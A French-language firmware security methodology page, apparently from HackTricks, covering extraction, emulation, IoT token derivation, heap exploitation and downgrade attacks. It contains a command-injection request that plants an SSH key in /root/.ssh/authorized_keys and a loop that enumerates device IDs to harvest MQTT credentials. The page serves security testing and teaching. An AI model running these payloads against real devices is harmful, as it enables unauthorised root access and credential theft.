# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, ce qui garantit que l’appareil peut accéder aux instructions indispensables dès sa mise sous tension et lancer ainsi le système d’exploitation. L’examen du firmware et sa modification éventuelle constituent une étape essentielle pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape essentielle pour comprendre la composition d’un appareil et les technologies qu’il utilise. Elle consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation utilisé
- Les caractéristiques du bootloader
- La disposition matérielle et les fiches techniques
- Les métriques de la base de code et l’emplacement des sources
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les diagrammes d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse de tout composant logiciel open source disponible, au moyen d’examens manuels et automatisés. Des outils tels que [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) proposent une analyse statique gratuite qui peut aider à détecter des problèmes potentiels.

## **Acquisition du firmware**

Le firmware peut être obtenu de différentes manières, chacune présentant un niveau de complexité qui lui est propre :

- Directement auprès de la source (développeurs, fabricants)
- En le compilant à partir des instructions fournies
- En le téléchargeant depuis les sites d’assistance officiels
- En utilisant des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- En accédant directement au **stockage cloud**, à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- En interceptant les **mises à jour** avec des techniques d’homme du milieu
- En l’**extrayant** de l’appareil par des connexions comme **UART**, **JTAG** ou **PICit**
- En **surveillant** les requêtes de mise à jour dans les communications de l’appareil
- En identifiant et en utilisant des **points de terminaison de mise à jour codés en dur**
- En en effectuant un **dump** depuis le bootloader ou le réseau
- En **retirant et en lisant** la puce de stockage, en dernier recours, à l’aide du matériel adapté

### Journaux UART uniquement : forcer un shell root via l’environnement U-Boot en mémoire flash

Si le RX UART est ignoré (journaux uniquement), vous pouvez tout de même forcer l’ouverture d’un shell init en **modifiant hors ligne le blob d’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Effectuer un dump de la mémoire flash SPI avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’env U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur l’UART.

C’est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais où la partition env est accessible en écriture via un accès externe à la flash.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` : si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour examiner le fichier.

### Récupération du système de fichiers

Avec les outils mentionnés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier nommé d’après le type de système de fichiers**, qui est habituellement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **n’aura pas l’octet magique du système de fichiers dans ses signatures**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire le système de fichiers compressé** du binaire, puis **extrayez manuellement** le système de fichiers selon son type en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour examiner le fichier binaire (désigné par `<bin>`) dans un premier temps. Ces commandes permettent d’identifier les types de fichiers, d’extraire des chaînes de caractères, d’analyser les données binaires et de comprendre les détails des partitions et du système de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer l’état du chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une faible entropie suggère une absence de chiffrement, tandis qu’une entropie élevée indique un chiffrement ou une compression possible.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l’inspection des fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé selon son type (par exemple, squashfs ou ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Elle consiste à utiliser `binwalk` pour localiser l’offset du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (p. ex. squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour en extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On examine les daemons réseau non sécurisés, les identifiants codés en dur, les endpoints d’API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés en vue d’une analyse hors ligne.

**Emplacements clés** et **éléments** à inspecter :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Certificats SSL et clés dans **etc/ssl**
- Fichiers de configuration et scripts susceptibles de présenter des vulnérabilités
- Binaires intégrés à analyser plus en détail
- Serveurs web et binaires courants des appareils IoT

Plusieurs outils permettent de découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Contrôles de sécurité des binaires compilés

Le code source comme les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à identifier les binaires non protégés susceptibles d’être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un endpoint cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Cette conception permet à quiconque connaît un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en clair et des préfixes de topics.

Procédure pratique :

1) Extraire le deviceId des journaux de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les journaux :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le motif d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (p. ex. MD5(deviceId||STATIC_KEY)).
- Générer le token dans Bash et mettre le digest en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composez l’URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abuser de MQTT en clair et des ACL de topic faibles (si présentes)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer les identifiants prévisibles des appareils (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fabricant, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les identifiants candidats, dériver des tokens et récupérer les configurations par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Obtenez toujours une autorisation explicite avant toute tentative d’énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.

L’émulation du firmware permet d’effectuer une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme individuel. Cette approche peut se heurter à des dépendances matérielles ou architecturales, mais le transfert du système de fichiers racine ou de binaires spécifiques vers un appareil doté d’une architecture et d’un boutisme correspondants, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter les tests.

### Émulation de binaires individuels

Pour examiner des programmes isolés, il est essentiel d’identifier le boutisme du programme et l’architecture du processeur.

#### Exemple avec une architecture MIPS

Pour émuler un binaire d’architecture MIPS, vous pouvez utiliser la commande :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, `qemu-mipsel` est le choix adapté.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé pour l’émulation.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, en automatisant le processus et en facilitant l’analyse dynamique.

## Analyse dynamique en pratique

À cette étape, un environnement d’appareil réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation ne reproduit pas toujours parfaitement les interactions matérielles, ce qui peut nécessiter de la redémarrer occasionnellement. L’analyse doit examiner à nouveau le système de fichiers, exploiter les pages web et les services réseau exposés, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour identifier d’éventuelles vulnérabilités de type backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement d’exécution, en utilisant des outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et identifier les vulnérabilités au moyen du fuzzing et d’autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` lié statiquement** sur l’appareil et attachez-vous-y à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappage des messages Zigbee / radio-co-processeur

Dans les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Une méthode utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par voie hertzienne
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole texte série/UART ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcheur de l’application** dans le démon principal
5. **Gestionnaire spécifique au protocole / machine à états**

Cette architecture fournit deux cibles de rétro-ingénierie au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, retrouvez :

- Les **groupes de messages** et les tables de dispatch
- Les messages pouvant provenir du **réseau** plutôt que du contrôleur lui-même
- Les champs discriminants exacts propres au fabricant (par exemple Zigbee `manufacturer_code` et `cluster_command` personnalisé)
- Les gestionnaires accessibles uniquement pendant la **mise en service**, la découverte ou les phases de téléchargement du firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible utilise encore la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic de mise en service peut révéler la **Network Key**. Les codes d’installation Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles propres au fabricant et accessibilité contrôlée par FSM

Les commandes Zigbee/ZCL spécifiques au fabricant constituent souvent une meilleure cible que les clusters normalisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Faites la rétro-ingénierie du dispatcheur de commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables d’**état FSM**, d’**événement**, de **vérification**, d’**action** et d’**état suivant**.
- Repérez les **états de transition** qui avancent automatiquement, ainsi que les branches de nouvelle tentative ou d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez les échanges de protocole légitimes nécessaires pour placer le démon dans l’état vulnérable, au lieu de supposer que le gestionnaire défectueux est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de niveau industriel, afin d’exposer les bons **endpoints**, **attributs** et timings de mise en service.

### Classe de bugs liés aux téléchargements fragmentés dans les démons embarqués

Une classe de bugs récurrente dans les firmwares concerne les **téléchargements fragmentés de blobs/modèles/configurations** :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **locaux au paquet** contrôlés par l’attaquant, comme `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier qu’elle respecte la **taille initialement allouée**.

Un attaquant peut ainsi envoyer :

- Un premier fragment valide avec une **petite** taille totale déclarée, afin de forcer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les vérifications récentes tout en faisant déborder le tampon initialement alloué.

Lorsque le chemin vulnérable est protégé par la logique de mise en service, l’exploitation doit inclure suffisamment d’**émulation de l’appareil** pour faire passer la cible à l’état de téléchargement attendu du modèle ou du blob avant l’envoi des fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les démons embarqués, le moyen le plus simple de déclencher l’exploitation des métadonnées du tas n’est souvent pas « attendre le nettoyage », mais **forcer la gestion d’erreur du protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM aux états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de tentatives afin que le démon **réinitialise le contexte** et libère le tampon corrompu.
- Utilisez cet appel prévisible à `free()` pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette technique est particulièrement utile contre les allocateurs **musl/uClibc/dlmalloc-like** sous Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Une méthode stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers des **faux chunks placés dans le tampon ayant débordé**, plutôt que d’écraser immédiatement de vrais pointeurs de bin et de faire planter le processus.

## Exploitation binaire et preuve de concept

Le développement d’un PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et de la programmation dans des langages de bas niveau. Les protections d’exécution binaires sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation importante ultérieure peut déclencher `__malloc_consolidate()`, donc tout faux chunk doit passer les vérifications (taille cohérente, `fd = 0` et chunks environnants considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé, mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire restent stables. Vous pouvez cibler une région qui ressemble déjà à un en-tête de chunk de tas valide pour faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL qui arrête l’analyseur :** lorsque le JSON est analysé, un `\x00` dans le payload peut interrompre l’analyse tout en conservant les octets contrôlés par l’attaquant qui suivent pour un pivot de pile/une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut placer du shellcode exécutable dans un mapping connu et transférer l’exécution vers celui-ci.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité des firmwares, équipés des outils nécessaires.

## Systèmes d’exploitation préparés pour analyser les firmwares

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur des appareils Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de tests de sécurité embarquée basé sur Ubuntu 18.04, préchargé avec des outils de test de sécurité des firmwares.

## Attaques par rétrogradation de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fournisseur vérifie les signatures cryptographiques des images de firmware, la **protection contre le retour à une version antérieure (rétrogradation)** est souvent omise. Lorsque le chargeur de démarrage ou de récupération vérifie uniquement la signature avec une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image à flasher, un attaquant peut installer légitimement un **ancien firmware vulnérable doté d’une signature toujours valide** et ainsi réintroduire des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Méthode d’attaque typique :

1. **Obtenir une ancienne image signée**
   * La récupérer depuis le portail de téléchargement public du fournisseur, son CDN ou son site d’assistance.
   * L’extraire des applications mobiles/de bureau associées (par exemple dans `assets/firmware/` d’un APK Android).
   * La récupérer dans des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Envoyer ou fournir l’image à l’appareil** par un canal de mise à jour exposé :
   * Interface Web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la récupération ou la mise à niveau.
3. Après la rétrogradation, exploiter une vulnérabilité corrigée dans une version plus récente (par exemple, un filtre contre l’injection de commandes ajouté ultérieurement).
4. Facultativement, réinstaller la dernière image ou désactiver les mises à jour pour éviter d’être détecté une fois la persistance obtenue.

### Exemple : injection de commandes après rétrogradation

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est directement concaténé à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer l’accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères élémentaire, mais l’absence de protection contre le downgrade rend ce correctif inutile.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fournisseurs intègrent des images complètes du firmware dans leurs applications mobiles associées afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces paquets sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins comme `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra`, ou même le simple outil `unzip`, permettent d’extraire des images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rollback limité à l’updater dans les conceptions à slots A/B

Certains fabricants implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées des slots, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception généralement faible :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans la mémoire persistante et rejette les anciennes images signées.
- Le bootloader n’analyse **pas** ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou un compteur de génération par slot et n’est **pas liée cryptographiquement** au digest exact du firmware qui a été validé.

Cela crée une primitive **valider-une-image / en-démarrer-une-autre** dans les systèmes à deux slots. Si l’attaquant peut faire en sorte que l’updater marque le slot B comme prochaine cible de démarrage à l’aide d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut quand même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel et signé** dans le slot passif, puis exécuter la routine normale de validation/basculement afin que la disposition marque ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot au cours de la même session.
3. Exploiter un état de démarrage obsolète ou une logique obsolète de sélection du slot pour que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien mais toujours signé** dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/l’intégrité et démarre l’ancienne image.

Points à rechercher lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- Une sélection du slot dérivée de **drapeaux de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Une routine du type `prepare_passive_slot()` qui efface un slot en fonction d’un état obsolète plutôt que de la **disposition actuellement validée**.
- Une fonction du type `part_write_layout()` qui ne fait qu’incrémenter un **compteur de génération** / un indicateur de slot actif sans enregistrer le hash de l’image validée.
- Des vérifications du ratchet implémentées en espace utilisateur ou dans le code de l’updater, mais **pas** dans la ROM / le bootloader / les étapes de secure boot.
- Des routines d’effacement ou de récupération qui laissent le slot marqué comme démarrable même après que son contenu a été supprimé et réécrit.

### Liste de contrôle pour évaluer la logique de mise à jour

* Le transport et l’authentification du *point de terminaison de mise à jour* sont-ils suffisamment protégés (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur monotone anti-rollback** avant le flashage ?
* L’image est-elle vérifiée dans une chaîne de secure boot (par exemple, signatures vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/le CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après un basculement réussi du slot, l’appareil est-il forcé de redémarrer, ou les routines ultérieures de mise à jour/d’effacement restent-elles accessibles au cours de la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, la carte des partitions autorisée, le numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmwares vulnérables pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans les firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération des clés de déchiffrement du firmware à partir de l’état KMS/Vault embarqué

Lorsqu’une image de mise à jour combine de petites métadonnées en clair avec un gros blob à haute entropie, analysez d’abord le conteneur avant toute tentative de brute force :<sup>[[1]](#references)</sup>

- Extrayez les en-têtes, les offsets et les limites de ligne avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format `enc` d’OpenSSL : les 8 octets suivants correspondent au sel et les octets restants au texte chiffré.
- Un champ Base64 qui se décode en exactement `256` octets est un indice fort qu’il s’agit d’un texte chiffré RSA-2048 qui encapsule un mot de passe de firmware ou une clé de session aléatoire.
- Les éléments PGP détachés présents dans le même fichier protègent souvent uniquement l’authenticité ; ne supposez pas qu’ils assurent la confidentialité.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingénieriez plutôt le **chemin de déchiffrement opérationnel** au lieu de chercher uniquement des clés privées :

- Décompilez le binaire de l’updater / de gestion et suivez le code pour déterminer qui lit le blob chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
